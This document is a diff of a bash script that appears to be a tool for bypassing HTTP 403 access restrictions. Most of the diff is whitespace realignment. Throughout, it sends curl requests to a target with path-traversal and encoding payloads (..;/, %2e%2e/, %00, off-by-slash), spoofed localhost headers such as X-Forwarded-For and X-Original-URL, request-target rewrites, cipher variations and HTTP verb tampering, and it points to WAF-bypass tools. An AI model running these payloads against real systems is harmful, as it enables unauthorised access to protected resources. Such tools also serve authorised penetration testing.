@@ -72,91 +72,91 @@ function payload_Suffux(){
 	# $1: full url with out "/" suffux
 	if [[ x$(echo ${1}|cut -d '/' -f4) != x ]]; then
 		# fix https://www.baidu.com<payload>
-		output "${1}*" $(curl_wapper "${1}*") &
-		output "${1};" $(curl_wapper "${1};") &
-		output "${1}%3f" $(curl_wapper "${1}%3f") &
-		output "${1}%20" $(curl_wapper "${1}%20") &
-		output "${1}%F3%A0%81%A9" $(curl_wapper "${1}%F3%A0%81%A9") &
-		output "${1};/" $(curl_wapper "${1};/") &
-		output "${1};.css" $(curl_wapper "${1};.css") &
-		output "${1}%2f" $(curl_wapper "${1}%2f") &
-		output "${1}.json" $(curl_wapper "${1}.json") &
-		output "${1}%23" $(curl_wapper "${1}%23") &
-		output "${1}%00" $(curl_wapper "${1}%00") &
-		output "${1}..;/" $(curl_wapper "${1}..;/") &
-		output "${1}../" $(curl_wapper "${1}../") &
-		output "${1}%" $(curl_wapper "${1}%") &
-		output "${1}?" $(curl_wapper "${1}? ") &
-		output "${1}??" $(curl_wapper "${1}??") &
-		output "${1}\..\.\\" $(curl_wapper "${1}\..\.\\") &
+		output "${1}*" 					$(curl_wapper "${1}*") &
+		output "${1};" 					$(curl_wapper "${1};") &
+		output "${1}%3f" 				$(curl_wapper "${1}%3f") &
+		output "${1}%20" 				$(curl_wapper "${1}%20") &
+		output "${1}%F3%A0%81%A9" 		$(curl_wapper "${1}%F3%A0%81%A9") &
+		output "${1};/" 				$(curl_wapper "${1};/") &
+		output "${1};.css" 				$(curl_wapper "${1};.css") &
+		output "${1}%2f" 				$(curl_wapper "${1}%2f") &
+		output "${1}.json" 				$(curl_wapper "${1}.json") &
+		output "${1}%23" 				$(curl_wapper "${1}%23") &
+		output "${1}%26" 				$(curl_wapper "${1}%26") &
+		output "${1}%00" 				$(curl_wapper "${1}%00") &
+		output "${1}..;/" 				$(curl_wapper "${1}..;/") &
+		output "${1}../" 				$(curl_wapper "${1}../") &
+		output "${1}%" 					$(curl_wapper "${1}%") &
+		output "${1}?" 					$(curl_wapper "${1}? ") &
+		output "${1}??" 				$(curl_wapper "${1}??") &
+		output "${1}\..\.\\" 			$(curl_wapper "${1}\..\.\\") &
+
 		upper_end=${1:0:${#1}-1}$(tr '[:lower:]' '[:upper:]' <<< ${1:${#1}-1:1})
 		lower_end=${1:0:${#1}-1}$(tr '[:upper:]' '[:lower:]' <<< ${1:${#1}-1:1})
-		output "${upper_end}" $(curl_wapper ${upper_end}) &
-		output "${lower_end}" $(curl_wapper ${lower_end}) &
+
+		output "${upper_end}" 			$(curl_wapper ${upper_end}) &
+		output "${lower_end}" 			$(curl_wapper ${lower_end}) &
 		wait
 	fi
 
-	output "${1}/*" $(curl_wapper "${1}/*") &
-	output "${1}/;" $(curl_wapper "${1}/;") &
-	output "${1}/%3f" $(curl_wapper "${1}/%3f") &
-	output "${1}/%" $(curl_wapper "${1}/%") &
-	output "${1}/?" $(curl_wapper "${1}/? ") &
-	output "${1}/;.css" $(curl_wapper "${1}/;.css") &
-	output "${1}/%00" $(curl_wapper "${1}/%00") &
-	output "${1}/??" $(curl_wapper "${1}/??") &
-	output "${1}/%20" $(curl_wapper "${1}/%20") &
-	output "${1}/%F3%A0%81%A9" $(curl_wapper "${1}/%F3%A0%81%A9") &
-	output "${1}/;/" $(curl_wapper "${1}/;/") &
-	output "${1}/%2f" $(curl_wapper "${1}/%2f") &
-	output "${1}/.json" $(curl_wapper "${1}/.json") &
-	output "${1}/%23" $(curl_wapper "${1}/%23") &
-	output "${1}/..;/" $(curl_wapper "${1}/..;/") &
+	output "${1}/*" 					$(curl_wapper "${1}/*") &
+	output "${1}/;" 					$(curl_wapper "${1}/;") &
+	output "${1}/%3f" 					$(curl_wapper "${1}/%3f") &
+	output "${1}/%" 					$(curl_wapper "${1}/%") &
+	output "${1}/?" 					$(curl_wapper "${1}/? ") &
+	output "${1}/;.css" 				$(curl_wapper "${1}/;.css") &
+	output "${1}/%00" 					$(curl_wapper "${1}/%00") &
+	output "${1}/??" 					$(curl_wapper "${1}/??") &
+	output "${1}/%20" 					$(curl_wapper "${1}/%20") &
+	output "${1}/%F3%A0%81%A9" 			$(curl_wapper "${1}/%F3%A0%81%A9") &
+	output "${1}/;/" 					$(curl_wapper "${1}/;/") &
+	output "${1}/%2f" 					$(curl_wapper "${1}/%2f") &
+	output "${1}/.json" 				$(curl_wapper "${1}/.json") &
+	output "${1}/%23" 					$(curl_wapper "${1}/%23") &
+	output "${1}/..;/" 					$(curl_wapper "${1}/..;/") &
 	wait
 
-	output "${1}/%09" $(curl_wapper "${1}/%09") &
-	output "${1}/.%2f" $(curl_wapper "${1}/.%2f") &
-	output "${1}/%2e" $(curl_wapper "${1}/%2e") &
-	output "${1}/%2e/" $(curl_wapper "${1}/%2e/") &
-	output "${1}//" $(curl_wapper "${1}//") &
-	output "${1}/./" $(curl_wapper "${1}/./") &
-	output "${1}/%2e%2e/" $(curl_wapper "${1}/%2e%2e/") &
-	output "${1}/%2e%2e%2f" $(curl_wapper "${1}/%2e%2e%2f") &
+	output "${1}/%09" 					$(curl_wapper "${1}/%09") &
+	output "${1}/.%2f" 					$(curl_wapper "${1}/.%2f") &
+	output "${1}/%2e" 					$(curl_wapper "${1}/%2e") &
+	output "${1}/%2e/" 					$(curl_wapper "${1}/%2e/") &
+	output "${1}//" 					$(curl_wapper "${1}//") &
+	output "${1}/./" 					$(curl_wapper "${1}/./") &
+	# output "${1}/%2e%2e/" 				$(curl_wapper "${1}/%2e%2e/") &
+	# output "${1}/%2e%2e%2f" 			$(curl_wapper "${1}/%2e%2e%2f") &
 	wait
 
-	output "${1}/randomstr/../" $(curl_wapper "${1}/randomstr/../") &
-	output "${1}/randomstr/..;/" $(curl_wapper "${1}/randomstr/..;/") &
-	output "${1}/randomstr/%2e%2e/" $(curl_wapper "${1}/randomstr/%2e%2e/") &
-	output "${1}/randomstr/%2e%2e%2f" $(curl_wapper "${1}/randomstr/%2e%2e%2f") &
+	# output "${1}/randomstr/../" 		$(curl_wapper "${1}/randomstr/../") &
+	# output "${1}/randomstr/..;/" 		$(curl_wapper "${1}/randomstr/..;/") &
+	# output "${1}/randomstr/%2e%2e/" 	$(curl_wapper "${1}/randomstr/%2e%2e/") &
+	# output "${1}/randomstr/%2e%2e%2f" 	$(curl_wapper "${1}/randomstr/%2e%2e%2f") &
 	wait
 }
 # https://www.baidu.com/dir1<payload>dir2
 function payload_Between(){
 	# $1 URL
 	# $2 DIR
-	if [[ x$(echo ${URL}|cut -d '/' -f4) != x ]]; then
-		# fix https://www.baidu.com<payload>dir
-		output "${1};/${2}" $(curl_wapper "${1};/${2}") &
-		output "${1}\..\.\\\\${2}" $(curl_wapper "${1}\..\.\\${2}") &
-		output "${1}../${2}" $(curl_wapper "${1}../${2}") &
-		wait
-	fi
+    output "${1}/%2e%2e%2f${2}"             $(curl_wapper "${1}/%2e%2e%2f${2}") &
+    output "${1}/%2e%2e/${2}"               $(curl_wapper "${1}/%2e%2e/${2}") &
+    output "${1}/.%2e/${2}"                 $(curl_wapper "${1}/.%2e/${2}") &
+    output "${1}/.%2f${2}"                  $(curl_wapper "${1}/.%2f${2}") &
+    output "${1}/..%00/${2}"                $(curl_wapper "${1}/..%00/${2}") &
+    output "${1}/..%0d/${2}"                $(curl_wapper "${1}/..%0d/${2}") &
+    output "${1}/..%2f${2}"                 $(curl_wapper "${1}/..%2f${2}") &
+    output "${1}/..%5c${2}"                 $(curl_wapper "${1}/..%5c${2}") &
+    output "${1}/..%ff/${2}"                $(curl_wapper "${1}/..%ff/${2}") &
+    output "${1}/../${2}"                   $(curl_wapper "${1}/../${2}") &
+    output "${1}/..;/${2}"                  $(curl_wapper "${1}/..;/${2}") &
+    output "${1}/..\\${2}"                  $(curl_wapper "${1}/..\\${2}") &
+    output "${1}/;/${2}"                    $(curl_wapper "${1}/;/${2}") &
 
-	output "${1}/%2e/${2}" $(curl_wapper "${1}/%2e/${2}") &
-	output "${1}/;${2}" $(curl_wapper "${1}/;${2}") &
-	output "${1}/randomstr/../${2}" $(curl_wapper "${1}/randomstr/../${2}") &
-	output "${1}/randomstr/..%2f${2}" $(curl_wapper "${1}/randomstr/..%2f${2}") &
-	output "${1}/randomstr/..;/${2}" $(curl_wapper "${1}/randomstr/..;/${2}") &
-	output "${1}/randomstr/%2e%2e/${2}" $(curl_wapper "${1}/randomstr/%2e%2e/${2}") &
-	output "${1}/randomstr/%2e%2e%2f${2}" $(curl_wapper "${1}/randomstr/%2e%2e%2f${2}") &
-	output "${1}/;/${2}" $(curl_wapper "${1}/;/${2}") &
-	output "${1}/./${2}" $(curl_wapper "${1}/./${2}") &
-	output "${1}/.%2f${2}" $(curl_wapper "${1}/.%2f${2}") &
-	output "${1}/%2f${2}" $(curl_wapper "${1}/%2f${2}") &
-	output "${1}//${2}" $(curl_wapper "${1}//${2}") &
+    output "${1}/${2}../${2}"               $(curl_wapper "${1}/${2}../${2}") & # nginx off by slash
+
 	upper_start=${1}/$(tr '[:lower:]' '[:upper:]' <<< ${2:0:1})${2:1}
 	lower_start=${1}/$(tr '[:upper:]' '[:lower:]' <<< ${2:0:1})${2:1}
-	output "${upper_start}" $(curl_wapper "${upper_start}") &
-	output "${lower_start}" $(curl_wapper "${lower_start}") &
+
+	output "${upper_start}" 				$(curl_wapper "${upper_start}") &
+	output "${lower_start}" 				$(curl_wapper "${lower_start}") &
 	wait
 }
 # https://www.baidu.com/dir1<payload>dir2<payload>
@@ -179,47 +179,47 @@ function payload_Header(){
 		output "X-Custom-IP-Authorization: 127.0.0.1 \t ${FULL_URL%/}..;/"  $(curl_wapper -H "X-Custom-IP-Authorization: 127.0.0.1" "${FULL_URL%/}..;/")
 	fi
 	output "X-Custom-IP-Authorization: 127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "X-Custom-IP-Authorization: 127.0.0.1" $FULL_URL) &
-	output "X-Forwarded-For: http://127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "X-Forwarded-For: http://127.0.0.1" $FULL_URL) &
-	output "X-Forward-For: http://127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "X-Forward-For: http://127.0.0.1" $FULL_URL) &
-	output "X-Forwarded-For: 127.0.0.1:80 \t $FULL_URL"  $(curl_wapper -H "X-Forwarded-For: 127.0.0.1:80" $FULL_URL) &
-	output "X-Original-URL: /$rewrite_url \t $fqdn_url"  $(curl_wapper -H "X-Original-URL: /$rewrite_url" "${fqdn_url}anything") &
-	output "X-Rewrite-URL: /$rewrite_url \t $fqdn_url"  $(curl_wapper -H "X-Rewrite-URL: /$rewrite_url" "${fqdn_url}anything") &
-	output "X-Forwarded-For: 127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "X-Forwarded-For: 127.0.0.1" $FULL_URL) &
-	output "X-Originating-IP: 127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "X-Originating-IP: 127.0.0.1" $FULL_URL) &
-	output "X-Remote-IP: 127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "X-Remote-IP: 127.0.0.1" $FULL_URL) &
-	output "X-Remote-Addr: 127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "X-Remote-Addr: 127.0.0.1" $FULL_URL) &
-	output "X-Client-IP: 127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "X-Client-IP: 127.0.0.1" $FULL_URL) &
-	output "X-Forwarded-Host: 127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "X-Forwarded-Host: 127.0.0.1" $FULL_URL) &
-	output "X-Host: 127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "X-Host: 127.0.0.1" $FULL_URL) &
-	output "Referer: $FULL_URL \t $FULL_URL"  $(curl_wapper -H "Referer: $FULL_URL" $FULL_URL) &
-	output "Host: 127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "Host: 127.0.0.1" $FULL_URL) &
-	output "Potential headers one curl" $(curl_wapper -H "Proxy-Host: 127.0.0.1" \
-													-H "Request-Uri: /$rewrite_url" \
-													-H "X-Forwarded: 127.0.0.1" \
-													-H "X-Forwarded-By: 127.0.0.1" \
-													-H "X-Forwarded-For-Original: 127.0.0.1" \
-													-H "X-Forwarded-Server: 127.0.0.1" \
-													-H "X-Forwarder-For: 127.0.0.1" \
-													-H "X-Forward-For: 127.0.0.1" \
-													-H "Base-Url: http://127.0.0.1/$rewrite_url" \
-													-H "Http-Url: http://127.0.0.1/$rewrite_url" \
-													-H "Proxy-Url: http://127.0.0.1/$rewrite_url" \
-													-H "Redirect: http://127.0.0.1/$rewrite_url" \
-													-H "Real-Ip: 127.0.0.1" \
-													-H "Referer: http://127.0.0.1/$rewrite_url" \
-													-H "Referrer: http://127.0.0.1/$rewrite_url" \
-													-H "Refferer: http://127.0.0.1/$rewrite_url" \
-													-H "Uri: /$rewrite_url" \
-													-H "Url: http://127.0.0.1/$rewrite_url" \
-													-H "X-Http-Destinationurl: 127.0.0.1" \
-													-H "X-Http-Host-Override: 127.0.0.1" \
-													-H "X-Original-Remote-Addr: 127.0.0.1" \
-													-H "X-Proxy-Url: http://127.0.0.1/$rewrite_url" \
-													-H "X-Real-Ip: 127.0.0.1" \
-													$FULL_URL) &
+	output "X-Forwarded-For: http://127.0.0.1 \t $FULL_URL"  	$(curl_wapper -H "X-Forwarded-For: http://127.0.0.1" $FULL_URL) &
+	output "X-Forward-For: http://127.0.0.1 \t $FULL_URL"  		$(curl_wapper -H "X-Forward-For: http://127.0.0.1" $FULL_URL) &
+	output "X-Forwarded-For: 127.0.0.1:80 \t $FULL_URL"  		$(curl_wapper -H "X-Forwarded-For: 127.0.0.1:80" $FULL_URL) &
+	output "X-Original-URL: /$rewrite_url \t $fqdn_url"  		$(curl_wapper -H "X-Original-URL: /$rewrite_url" "${fqdn_url}anything") &
+	output "X-Rewrite-URL: /$rewrite_url \t $fqdn_url"  		$(curl_wapper -H "X-Rewrite-URL: /$rewrite_url" "${fqdn_url}anything") &
+	output "X-Forwarded-For: 127.0.0.1 \t $FULL_URL" 			$(curl_wapper -H "X-Forwarded-For: 127.0.0.1" $FULL_URL) &
+	output "X-Originating-IP: 127.0.0.1 \t $FULL_URL"  			$(curl_wapper -H "X-Originating-IP: 127.0.0.1" $FULL_URL) &
+	output "X-Remote-IP: 127.0.0.1 \t $FULL_URL"  				$(curl_wapper -H "X-Remote-IP: 127.0.0.1" $FULL_URL) &
+	output "X-Remote-Addr: 127.0.0.1 \t $FULL_URL"  			$(curl_wapper -H "X-Remote-Addr: 127.0.0.1" $FULL_URL) &
+	output "X-Client-IP: 127.0.0.1 \t $FULL_URL"  				$(curl_wapper -H "X-Client-IP: 127.0.0.1" $FULL_URL) &
+	output "X-Forwarded-Host: 127.0.0.1 \t $FULL_URL"  			$(curl_wapper -H "X-Forwarded-Host: 127.0.0.1" $FULL_URL) &
+	output "X-Host: 127.0.0.1 \t $FULL_URL"  					$(curl_wapper -H "X-Host: 127.0.0.1" $FULL_URL) &
+	output "Referer: $FULL_URL \t $FULL_URL"  					$(curl_wapper -H "Referer: $FULL_URL" $FULL_URL) &
+	output "Host: 127.0.0.1 \t $FULL_URL"  						$(curl_wapper -H "Host: 127.0.0.1" $FULL_URL) &
+	output "Potential headers one curl" 						$(curl_wapper -H "Proxy-Host: 127.0.0.1" \
+																	-H "Request-Uri: /$rewrite_url" \
+																	-H "X-Forwarded: 127.0.0.1" \
+																	-H "X-Forwarded-By: 127.0.0.1" \
+																	-H "X-Forwarded-For-Original: 127.0.0.1" \
+																	-H "X-Forwarded-Server: 127.0.0.1" \
+																	-H "X-Forwarder-For: 127.0.0.1" \
+																	-H "X-Forward-For: 127.0.0.1" \
+																	-H "Base-Url: http://127.0.0.1/$rewrite_url" \
+																	-H "Http-Url: http://127.0.0.1/$rewrite_url" \
+																	-H "Proxy-Url: http://127.0.0.1/$rewrite_url" \
+																	-H "Redirect: http://127.0.0.1/$rewrite_url" \
+																	-H "Real-Ip: 127.0.0.1" \
+																	-H "Referer: http://127.0.0.1/$rewrite_url" \
+																	-H "Referrer: http://127.0.0.1/$rewrite_url" \
+																	-H "Refferer: http://127.0.0.1/$rewrite_url" \
+																	-H "Uri: /$rewrite_url" \
+																	-H "Url: http://127.0.0.1/$rewrite_url" \
+																	-H "X-Http-Destinationurl: 127.0.0.1" \
+																	-H "X-Http-Host-Override: 127.0.0.1" \
+																	-H "X-Original-Remote-Addr: 127.0.0.1" \
+																	-H "X-Proxy-Url: http://127.0.0.1/$rewrite_url" \
+																	-H "X-Real-Ip: 127.0.0.1" \
+																	$FULL_URL) &
 	wait
-	output "${METHOD} ${FULL_URL} HTTP/1.1 \t Host: 127.0.0.1" $(curl_wapper -H "Host: 127.0.0.1" --request-target  "${FULL_URL}" $FULL_URL) &
-	output "${METHOD} http://127.0.0.1/${rewrite_url} HTTP/1.1" $(curl_wapper --request-target  "http://127.0.0.1/${rewrite_url}" $FULL_URL) &
+	output "${METHOD} ${FULL_URL} HTTP/1.1 \t Host: 127.0.0.1" 			$(curl_wapper -H "Host: 127.0.0.1" --request-target  "${FULL_URL}" $FULL_URL) &
+	output "${METHOD} http://127.0.0.1/${rewrite_url} HTTP/1.1" 		$(curl_wapper --request-target  "http://127.0.0.1/${rewrite_url}" $FULL_URL) &
 	wait
 }
 
@@ -244,23 +244,23 @@ if [ $ONLY_URL -eq 1 ]; then
 fi
 ######################## ip/http versoin ######################### 
 printf "\n${GREEN}[+] IP/HTTP Version...${CLEAR}\n"
-output "ipv4 "  $(curl_wapper -4 $FULL_URL) &
-output "ipv6 "  $(curl_wapper -6 $FULL_URL) &
-output "HTTP/2 prior knowledge" $(curl_wapper --http2-prior-knowledge $FULL_URL) &
-output "HTTP/2 " $(curl_wapper --http2 $FULL_URL) &
-output "HTTP/1.0 " $(curl_wapper --http1.0 $FULL_URL) &
-output "HTTP/0.9 " $(curl_wapper --http0.9 $FULL_URL) &
+output "ipv4 "  		$(curl_wapper -4 $FULL_URL) &
+output "ipv6 "  		$(curl_wapper -6 $FULL_URL) &
+output "HTTP/2 prior knowledge" 	$(curl_wapper --http2-prior-knowledge $FULL_URL) &
+output "HTTP/2 " 		$(curl_wapper --http2 $FULL_URL) &
+output "HTTP/1.0 " 		$(curl_wapper --http1.0 $FULL_URL) &
+output "HTTP/0.9 " 		$(curl_wapper --http0.9 $FULL_URL) &
 wait
 ######################## ssl ciphers ######################### 
 if [[ ${FULL_URL:0:5} == https ]];then
 	printf "\n${GREEN}[+] SSL ciphers abusing ...${CLEAR}\n"
-	output "ECDHE-RSA-AES256-SHA" $(curl_wapper --ciphers ECDHE-RSA-AES256-SHA $FULL_URL)
-	output "ECDHE-RSA-AES128-GCM-SHA256" $(curl_wapper --ciphers ECDHE-RSA-AES128-GCM-SHA256 $FULL_URL)
-	output "ECDHE-ECDSA-AES256-GCM-SHA384" $(curl_wapper --ciphers ECDHE-ECDSA-AES256-GCM-SHA384 $FULL_URL)
-	output "ECDHE-RSA-AES256-GCM-SHA384" $(curl_wapper --ciphers ECDHE-RSA-AES256-GCM-SHA384 $FULL_URL)
-	output "ECDHE-RSA-AES256-SHA384" $(curl_wapper --ciphers ECDHE-RSA-AES256-SHA384 $FULL_URL)
-	output "AES256-GCM-SHA384" $(curl_wapper --ciphers AES256-GCM-SHA384 $FULL_URL)
-	output "DHE-RSA-AES256-GCM-SHA384" $(curl_wapper --ciphers DHE-RSA-AES256-GCM-SHA384 $FULL_URL)
+	output "ECDHE-RSA-AES256-SHA" 			$(curl_wapper --ciphers ECDHE-RSA-AES256-SHA $FULL_URL)
+	output "ECDHE-RSA-AES128-GCM-SHA256" 	$(curl_wapper --ciphers ECDHE-RSA-AES128-GCM-SHA256 $FULL_URL)
+	output "ECDHE-ECDSA-AES256-GCM-SHA384" 	$(curl_wapper --ciphers ECDHE-ECDSA-AES256-GCM-SHA384 $FULL_URL)
+	output "ECDHE-RSA-AES256-GCM-SHA384" 	$(curl_wapper --ciphers ECDHE-RSA-AES256-GCM-SHA384 $FULL_URL)
+	output "ECDHE-RSA-AES256-SHA384" 		$(curl_wapper --ciphers ECDHE-RSA-AES256-SHA384 $FULL_URL)
+	output "AES256-GCM-SHA384" 				$(curl_wapper --ciphers AES256-GCM-SHA384 $FULL_URL)
+	output "DHE-RSA-AES256-GCM-SHA384" 		$(curl_wapper --ciphers DHE-RSA-AES256-GCM-SHA384 $FULL_URL)
 	printf "More ciphers be supported in tools: \n"
 	printf "\thttps://github.com/LandGrey/abuse-ssl-bypass-waf.git\n"
 	printf "\thttps://github.com/viperbluff/WAF_buster.git\n"
@@ -271,11 +271,11 @@ printf "\n${GREEN}[+] HTTP Methods...${CLEAR}\n"
 for Verb in {"OPTIONS","HEAD","PUT","POST","TRACE","TRACK","PATCH","MOVE","CONNECT"}
 do
 	if [[ $Verb == "POST" ]]; then
-		output "$Verb \t $FULL_URL" $(curl_wapper -H "Content-Length: 0" -X POST $FULL_URL) &
+		output "$Verb \t $FULL_URL" 		$(curl_wapper -H "Content-Length: 0" -X POST $FULL_URL) &
 	elif [[  $Verb == "HEAD"  ]]; then
-		output "$Verb \t $FULL_URL" $(curl_wapper -m 2 -X HEAD $FULL_URL) & # timeout=1
+		output "$Verb \t $FULL_URL" 		$(curl_wapper -m 2 -X HEAD $FULL_URL) & # timeout=1
 	else
-		output "$Verb \t $FULL_URL" $(curl_wapper -X $Verb $FULL_URL) &
+		output "$Verb \t $FULL_URL" 		$(curl_wapper -X $Verb $FULL_URL) &
 	fi
 done
 wait
